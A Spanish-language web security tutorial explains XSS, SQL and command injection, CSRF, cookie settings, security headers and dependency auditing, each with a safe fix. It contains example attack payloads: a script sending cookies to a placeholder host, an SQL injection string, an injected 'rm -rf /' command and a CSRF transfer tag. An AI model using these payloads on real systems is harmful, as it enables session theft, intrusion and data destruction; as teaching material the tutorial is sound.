Seguridad en aplicaciones web

Una aplicación web recibe datos de personas que no controlas y los muestra a personas que tampoco controlas. La seguridad web es, ante todo, decidir qué datos son confiables y tratar el resto como amenaza. Aquí verás los ataques más habituales, cómo se explotan y cómo se previenen en tu propio código.

La mentalidad: no confiar en la entrada

Todo dato que llega de fuera —formularios, parámetros de URL, cabeceras, cookies, respuestas de API, archivos subidos— es dudoso por defecto. Aunque la interfaz valide del lado del cliente, cualquiera puede enviar peticiones a mano con curl, así que la única validación que cuenta es la del servidor.

La regla clásica: «validar en la entrada, escapar en la salida». Comprueba que el dato tenga la forma esperada cuando llega, y conviértelo en texto inofensivo justo antes de usarlo, según el contexto donde vaya a terminar.

XSS: inyección de código en el navegador

Cross-Site Scripting ocurre cuando un dato del usuario termina interpretado como JavaScript o HTML por el navegador de otra persona. El atacante ejecuta código en el origen de tu sitio: puede leer el DOM, robar cookies y suplantar acciones.

Ejemplo vulnerable — un comentario que se imprime sin escapar:

# El atacante escribe esto como "comentario"
  <script>fetch('https://malo.ejemplo/?c=' + document.cookie)</script>

  // Renderizado SIN escapar: el script se ejecuta en cada visitante
  document.innerHTML = 'Comentario: ' + comentario;   // ¡peligro!

Versión segura: tratar el dato como texto, nunca como HTML:

// textContent no interpreta etiquetas: el <script> queda como texto visible
  const parrafo = document.createElement('p');
  parrafo.textContent = 'Comentario: ' + comentario;  // seguro
  • Reflejado: el dato malicioso viaja en la propia petición (URL, formulario).
  • Almacenado: se guarda (base de datos) y ataca a todos los visitantes.
  • DOM-based: el código cliente manipula el DOM con datos no confiables.

Prefiere APIs que asignan texto (textContent, createTextNode) a las que asignan HTML (innerHTML, insertAdjacentHTML). innerHTML solo con contenido que tú generaste, jamás con datos del usuario.

Inyección SQL y de comandos

Si concatenas entrada del usuario dentro de una sentencia SQL o de un comando del sistema, el usuario puede cambiar lo que ejecutas. Es uno de los ataques más antiguos y sigue siendo frecuente.

Vulnerable: el usuario escribe '' OR 1=1 -- como contraseña:

const q = "SELECT * FROM usuarios WHERE nombre='" + nombre + "' AND clave='" + clave + "'";

Seguro: la base de datos distingue el código de los datos por ti:

// Consultas preparadas: los parámetros son datos, nunca código SQL
  const filas = await db.query(
    'SELECT id FROM usuarios WHERE nombre = ? AND clave = ?',
    [nombre, clave]
  );
# INYECCIÓN DE COMANDOS: nunca interpolar entrada en un shell
  # Peligro: entradas = "archivo.txt; rm -rf /"
  exec('cat ' + entradas);

  # Seguro: se pasa como argumento separado, sin que se interprete el ';'
  execFile('cat', [entradas]);  // o validar la forma exacta esperada

CSRF: peticiones falsas con tu sesión

Cross-Site Request Forgery aprovecha que el navegador envía automáticamente las cookies (de sesión incluidas) a tu servidor, incluso cuando la petición la lanzó otro sitio. Si estás autenticado, una página maliciosa puede hacer «clic por ti». 


  <img src="https://banco.ejemplo/transferir?cantidad=1000&destino=atacante">

Defensas habituales:

  • Token anti-CSRF: el servidor entrega un valor aleatorio que el formulario envía de vuelta; el atacante no puede leerlo desde otro origen.
  • Cookies SameSite: evita enviar la cookie en peticiones cross-site.
  • No usar GET con efectos: acciones que cambian datos deben exigir POST/PUT/DELETE.
  • Revisar el encabezado Origin o Referer en cambios críticos.

Validar, sanear y escapar

Son tres operaciones distintas, no sinónimos:

Operación Qué hace Ejemplo
ValidarRechazar lo que no cumple el formato esperadoEmail con @, edad numérica, id entero
SanearLimpiar el dato eliminando lo peligrosoPermitir HTML limitado en un editor
EscaparCodificar el dato para el contexto de salida< → &lt; en HTML; \' en SQL sin preparadas

Lista blanca mejor que lista negra: define qué sí es permitido («solo letras y números») en vez de intentar enumerar todo lo peligroso. 

// Validar del lado del servidor, no solo en el cliente
  const id = Number(req.params.id);
  if (!Number.isInteger(id) || id <= 0) {
    return res.status(400).json({ error: 'id inválido' });
  }

Cookies de sesión

La cookie de sesión es la llave de la cuenta del usuario; configúrala para que sea difícil que la roben o que la usen otros sitios: 

Set-Cookie: sesión=abc123;
  Secure;          // solo viaja por HTTPS
  HttpOnly;        // JavaScript no puede leerla (mitiga el robo vía XSS)
  SameSite=Lax;    // no se envía en peticiones cross-site habituales
  Path=/;
  Max-Age=3600;

Además: rotar el identificador al iniciar sesión, caducar las sesiones inactivas y invalidar la sesión en el servidor al cerrar sesión (no basta con borrar la cookie).

HttpOnly no evita el XSS, pero le quita al atacante el objetivo más jugoso. Las contraseñas y los datos sensibles van en el cuerpo de peticiones protegidas, nunca en URLs ni en localStorage accesible a cualquier script de la página.

Cabeceras de seguridad

El servidor instruye al navegador mediante cabeceras de respuesta. Son una segunda capa que limita el daño si algo falla en tu código:

Cabecera Para qué sirve
Content-Security-PolicyLista blanca de orígenes de scripts/estilos; la defensa más fuerte contra XSS.
X-Content-Type-Options: nosniffEvita que el navegador «adivine» tipos MIME y ejecute lo que no es.
frame-ancestors (CSP) o X-Frame-OptionsImpide que tu sitio se incruste en otro (clickjacking).
Referrer-PolicyControla cuánta URL de origen viaja a otros sitios.
Strict-Transport-SecurityObliga a usar HTTPS siempre (HSTS) para ese dominio.
Permissions-PolicyDesactiva APIs del navegador que no usas (cámara, geolocalización…).

Ejemplo de política CSP para un sitio propio que no carga recursos externos:

Content-Security-Policy:
  default-src 'self';
  script-src 'self';
  style-src 'self';
  img-src 'self' data:;
  frame-ancestors 'none';

Empieza en modo informe (Content-Security-Policy-Report-Only) para ver qué bloquearía tu política antes de activarla, porque una CSP mal escrita rompe scripts legítimos.

Dependencias y secretos

Tu código es solo parte de la aplicación: la mitad del riesgo está en las librerías que usas y en los secretos que la ponen en marcha.

  • Ten un lockfile (package-lock.json) y audítalo de vez en cuando.
  • Actualiza con regularidad: las vulnerabilidades conocidas se parchean, no se ignoran.
  • Menos dependencias = menos superficie de ataque.
# Auditar dependencias de Node (reporta vulnerabilidades conocidas)
  npm audit
  npm audit fix

# Comprobación equivalente en Python
  pip-audit

Los secretos (claves de API, credenciales de BD) viven fuera del código: en variables de entorno o en un gestor de secretos. El repositorio es público para siempre en cuanto se publica una vez; rota cualquier credencial que haya aparecido en él.

# .gitignore antes del primer commit
  .env
  *.pem
  # busca en la historia si ya se colaron: git log -S 'API_KEY'

Comprobar tu propia web

Ejercicios sencillos que puedes hacer hoy, contra tu propio sitio:

# 1) ¿Qué cabeceras de seguridad devuelvo?
  curl -I https://tudominio.ejemplo/
  curl -sI https://tudominio.ejemplo/ | grep -iE 'content-security|strict|x-frame|referrer'

# 2) ¿Acepto peticiones de otros orígenes donde no debería? (comprobar CORS)
  curl -sI -H 'Origin: https://otro-sitio.ejemplo' https://tudominio.ejemplo/api/datos \
    | grep -i 'access-control-allow-origin'

# 3) ¿Acepta mi API entradas absurdas sin rechazarlas?
  curl -s "https://tudominio.ejemplo/api/buscar?q=%3Cscript%3E" | grep -i script

# 4) ¿Qué cookies establece mi inicio de sesión?
  curl -sI -X POST https://tudominio.ejemplo/login | grep -i set-cookie

Prueba solo sobre tus propios proyectos o con autorización explícita. Estos puntos de verificación complementan Ciberseguridad · Comandos de verificación y Ciberseguridad · Verificar certificados TLS.

Buenas prácticas

  • Escapa siempre en la salida y usa consultas preparadas en cada consulta SQL.
  • Valida del lado del servidor aunque el cliente también valide.
  • Errores genéricos al usuario, detalles solo en los registros; no filtres rutas ni versiones.
  • Minimiza permisos: las cookies de sesión llevan HttpOnly y SameSite.
  • Añade y revisa las cabeceras de seguridad; no todas necesitan herramientas externas.
  • Actualiza dependencias y rota credenciales; una clave filtrada caduca el día que se filtra.
  • Registra los fallos: lo que no se mide no se protege.
